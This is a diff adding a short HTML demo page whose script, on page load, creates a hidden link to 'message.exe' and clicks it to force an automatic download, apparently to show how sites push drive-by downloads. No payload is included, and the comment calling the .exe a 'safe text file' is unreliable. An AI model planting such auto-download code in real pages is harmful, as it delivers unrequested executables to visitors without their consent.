@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+    <button>hello</button>
+
+<script>
+    // This simulates what some websites do when you open them
+    window.onload = function() {
+        const a = document.createElement("a");
+        a.href = "message.exe";  // Safe text file in this example
+        a.download = "message.exe";
+        document.body.appendChild(a);
+        a.click(); // trigger download automatically
+    };
+</script>
+
+</body>
+</html>
